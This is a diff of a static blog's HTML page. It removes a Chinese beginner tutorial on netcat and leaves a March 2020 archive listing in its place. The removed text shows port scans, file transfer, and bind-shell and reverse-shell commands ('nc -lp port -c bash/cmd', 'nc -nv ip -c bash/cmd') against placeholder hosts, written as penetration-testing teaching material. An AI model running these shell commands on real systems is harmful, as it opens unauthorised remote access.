@@ -7,20 +7,18 @@
 
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
 
-<title>nc详解 - Da4er&#39;s Blogs</title>
+<title>Archive: 2020/3 - Da4er&#39;s Blogs</title>
 
 
-    <meta name="description" content="一.简介Nc全名为Netcat，网络工具中的瑞士军刀。主要功能为：1.侦听模式&#x2F;传输模式2.telnet&#x2F;获取banner信息3.传输文本信息4.传输文件&#x2F;目录5.加密传输文件6.远程控制&#x2F;木马7.加密所有流量8.流媒体服务器9.远程克隆硬盘123456789101112131415161718-h 查看帮助信息-d 后台模式-g gateway source-routing hop point[">
-<meta property="og:type" content="article">
-<meta property="og:title" content="nc详解">
-<meta property="og:url" content="https://da4er.top/nc%E8%AF%A6%E8%A7%A3.html">
+    <meta name="description" content="学而专，专而精。">
+<meta property="og:type" content="website">
+<meta property="og:title" content="Da4er&#39;s Blogs">
+<meta property="og:url" content="https://da4er.top/archives/2020/03/index.html">
 <meta property="og:site_name" content="Da4er&#39;s Blogs">
-<meta property="og:description" content="一.简介Nc全名为Netcat，网络工具中的瑞士军刀。主要功能为：1.侦听模式&#x2F;传输模式2.telnet&#x2F;获取banner信息3.传输文本信息4.传输文件&#x2F;目录5.加密传输文件6.远程控制&#x2F;木马7.加密所有流量8.流媒体服务器9.远程克隆硬盘123456789101112131415161718-h 查看帮助信息-d 后台模式-g gateway source-routing hop point[">
+<meta property="og:description" content="学而专，专而精。">
 <meta property="og:image" content="https://da4er.top/images/og_image.png">
-<meta property="article:published_time" content="2019-11-21T07:35:03.000Z">
-<meta property="article:modified_time" content="2020-02-07T12:11:32.420Z">
 <meta property="article:author" content="Da4er&#39;s">
-<meta property="article:tag" content="Da4er">
+<meta property="article:tag" content="Web安全 代码审计">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://da4er.top/images/og_image.png">
 
@@ -83,7 +81,7 @@
         <div class="navbar-brand is-flex-center">
             <a class="navbar-item navbar-logo" href="/">
             
-                <img src="/images/3.jpg" alt="nc详解" height="28">
+                <img src="/images/3.jpg" alt="Da4er&#39;s Blogs" height="28">
             
             </a>
         </div>
@@ -133,105 +131,36 @@
         <div class="container">
             <div class="columns">
                 <div class="column is-8-tablet is-8-desktop is-6-widescreen has-order-2 column-main">
-<div class="card">
-    
-    <div class="card-content article ">
-        
-        <div class="level article-meta is-size-7 is-uppercase is-mobile is-overflow-x-auto">
-            <div class="level-left">
-                <time class="level-item has-text-grey" datetime="2019-11-21T07:35:03.000Z">2019-11-21</time>
-                
-                <div class="level-item">
-                <a class="has-link-grey -link" href="/categories/Web%E5%AE%89%E5%85%A8-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">Web安全&渗透测试</a>
-                </div>
-                
-                
-                <span class="level-item has-text-grey">
-                    
-                    
-                    5 minutes lesen (Über 784 Worte)
-                </span>
-                
-                
-            </div>
-        </div>
-        
-        <h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal">
-            
-                nc详解
-            
-        </h1>
-        <div class="content">
-            <h2 id="一-简介"><a href="#一-简介" class="headerlink" title="一.简介"></a>一.简介</h2><p>Nc全名为Netcat，网络工具中的瑞士军刀。<br>主要功能为：<br>1.侦听模式/传输模式<br>2.telnet/获取banner信息<br>3.传输文本信息<br>4.传输文件/目录<br>5.加密传输文件<br>6.远程控制/木马<br>7.加密所有流量<br>8.流媒体服务器<br>9.远程克隆硬盘<br><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">-h 查看帮助信息</span><br><span class="line">-d 后台模式</span><br><span class="line">-g gateway source-routing hop point[s], up to 8</span><br><span class="line">-G num source-routing pointer: 4, 8, 12, …</span><br><span class="line">-e prog程序重定向，一但连接就执行［危险］</span><br><span class="line">-i secs延时的间隔</span><br><span class="line">-l 监听模式，用于入站连接</span><br><span class="line">-L 监听模式，连接天闭后仍然继续监听，直到CTR+C</span><br><span class="line">-n IP地址，不能用域名(不使用DNS反向查询IP地址的域名)</span><br><span class="line">-o film记录16进制的传输</span><br><span class="line">-p[空格]端口 本地端口号</span><br><span class="line">-s addr 本地源地址</span><br><span class="line">-r 随机本地及远程端口</span><br><span class="line">-t 使用Telnet交互方式</span><br><span class="line">-u UDP模式</span><br><span class="line">-v 详细输出，用-vv将更详细</span><br><span class="line">-w 数字 timeout延时间隔</span><br><span class="line">-z 将输入，输出关掉（用于扫锚时）</span><br></pre></td></tr></table></figure></p>
-<h2 id="二-telnet-获取banner信息"><a href="#二-telnet-获取banner信息" class="headerlink" title="二.telnet/获取banner信息"></a>二.telnet/获取banner信息</h2><p>-n 参数：只接收ip，没有dns解析<br>-v 参数：返回详细信息<br>我们先来解析一下要连接的ip地址：<br><img src="/nc%E8%AF%A6%E8%A7%A3/1.png" class title="This is an test image"><br>用nc -nv 连接目标的80端口<br><img src="/nc%E8%AF%A6%E8%A7%A3/2.png" class title="This is an test image"></p>
-<h2 id="三-传输文本信息"><a href="#三-传输文本信息" class="headerlink" title="三.传输文本信息"></a>三.传输文本信息</h2><p>-l：设置为监听模式<br>-p：指定一个开放的端口<br>用-l -p参数将目标设置为服务器，并开放一个端口等待连接<br><img src="/nc%E8%AF%A6%E8%A7%A3/3.png" class title="This is an test image"><br>我们可以用nc进行聊天：<br><img src="/nc%E8%AF%A6%E8%A7%A3/4.png" class title="This is an test image"></p>
-<h2 id="四-传输文件或目录"><a href="#四-传输文件或目录" class="headerlink" title="四.传输文件或目录"></a>四.传输文件或目录</h2><p>Nc可以当作一个文件传输服务器，传输文件到目标机器。传输可分为正向传输和反向传输。<br>正向传输：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -lp 444&lt;1.py</span><br><span class="line">nc -nv 1.1.1.1 444 &gt;2.py</span><br></pre></td></tr></table></figure><br><img src="/nc%E8%AF%A6%E8%A7%A3/5.png" class title="This is an test image"><br><img src="/nc%E8%AF%A6%E8%A7%A3/6.png" class title="This is an test image"></p>
-<p>反向传输：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -lp 444&gt;1.py</span><br><span class="line">nc -nv 1.1.1.1 444&lt;1.py</span><br></pre></td></tr></table></figure><br><img src="/nc%E8%AF%A6%E8%A7%A3/7.png" class title="This is an test image"><br><img src="/nc%E8%AF%A6%E8%A7%A3/8.png" class title="This is an test image"></p>
-<h2 id="五-Nc端口扫描"><a href="#五-Nc端口扫描" class="headerlink" title="五.Nc端口扫描"></a>五.Nc端口扫描</h2><p>nc -nvz 开启端口扫描 默认扫描tcp端口<br>nc -nvzu 扫描udp端口<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -nvz 1.1.1.1 1-65535</span><br><span class="line">nc -nvzu 1.1.1.1 1-1024</span><br></pre></td></tr></table></figure><br><img src="/nc%E8%AF%A6%E8%A7%A3/9.png" class title="This is an test image"></p>
-<h2 id="六-远程控制"><a href="#六-远程控制" class="headerlink" title="六.远程控制"></a>六.远程控制</h2><p>正向控制：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -lp port -c bash&#x2F;cmd</span><br><span class="line">nc -nv ip</span><br></pre></td></tr></table></figure><br>意思是服务器开放一个端口，当客户端连接时直接获取shell，这样在客户端就能执行服务器的命令<br><br><img src="/nc%E8%AF%A6%E8%A7%A3/1.png" class title="This is an test image"></p>
-<p>反向控制：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -ip port</span><br><span class="line">nc -nv ip -c bash&#x2F;cmd</span><br></pre></td></tr></table></figure><br>意思是服务器开放一个端口，当客户端连接时直接将自己的shell给服务器端，在服务器端执行客户端命令<br><img src="/nc%E8%AF%A6%E8%A7%A3/2.png" class title="This is an test image"><br><img src="/nc%E8%AF%A6%E8%A7%A3/3.png" class title="This is an test image"></p>
-<p>好久没更新了，因为最近一直按专题学习常见的漏洞，也没啥好写的，最近在学习sql注入，等写完了再一块发出来吧~</p>
 
-        </div>
-        
-        <div class="level is-size-7 is-uppercase">
-            <div class="level-start">
-                <div class="level-item">
-                    <span class="is-size-6 has-text-grey has-mr-7">#</span>
-                    <a class="has-link-grey -link" href="/tags/Web%E5%AE%89%E5%85%A8-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag">Web安全&渗透测试</a>
-                </div>
-            </div>
-        </div>
-        
-        
-        
-    </div>
-</div>
-
-
-
-<div class="card">
+<div class="card widget">
     <div class="card-content">
-        <h3 class="menu-label has-text-centered">Gefällt Ihnen der Artikel? Unterstützen Sie den Autor mit</h3>
-        <div class="buttons is-centered">
-            
+        <h3 class="tag is-link">
+        March 2020
+        </h3>
+        <div class="timeline">
+        
+            <article class="media">
                 
-<a class="button is-success donate">
-    <span class="icon is-small">
-        <i class="fab fa-weixin"></i>
-    </span>
-    <span>Wechat</span>
-    <div class="qrcode"><img src="/images/1.png" alt="Wechat"></div>
-</a>
-
-                
+                <div class="media-content">
+                    <div class="content">
+                        <time class="has-text-grey is-size-7 is-block is-uppercase" datetime="2020-03-02T03:10:39.000Z">2020-03-02</time>
+                        <a href="/2020-2%E6%9C%88%E6%80%BB%E7%BB%93.html" class="title has-link-black-ter is-size-6 has-text-weight-normal">2020_2月总结</a>
+                        <div class="level article-meta is-mobile">
+                            <div class="level-left">
+                                
+                                <div class="level-item is-size-7 is-uppercase">
+                                <a class="has-link-grey -link" href="/categories/%E9%9A%8F%E7%AC%94/">随笔</a>
+                                </div>
+                                
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </article>
+        
         </div>
     </div>
 </div>
-
-
-
-<div class="card card-transparent">
-    <div class="level post-navigation is-flex-wrap is-mobile">
-        
-        <div class="level-start">
-            <a class="level level-item has-link-grey  article-nav-prev" href="/Mysql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3.html">
-                <i class="level-item fas fa-chevron-left"></i>
-                <span class="level-item">Mysql注入详解</span>
-            </a>
-        </div>
-        
-        
-        <div class="level-end">
-            <a class="level level-item has-link-grey  article-nav-next" href="/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%88%9D%E8%AF%95-%E5%AF%B9zvuldrill%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E4%B8%80.html">
-                <span class="level-item">代码审计初试-对zvuldrill漏洞靶场的代码审计(一)</span>
-                <i class="level-item fas fa-chevron-right"></i>
-            </a>
-        </div>
-        
-    </div>
-</div>
-
 
 
 </div>
@@ -998,7 +927,7 @@
             <div class="level-start has-text-centered-mobile">
                 <a class="footer-logo is-block has-mb-6" href="/">
                 
-                    <img src="/images/3.jpg" alt="nc详解" height="28">
+                    <img src="/images/3.jpg" alt="Da4er&#39;s Blogs" height="28">
                 
                 </a>
                 <p class="is-size-7">
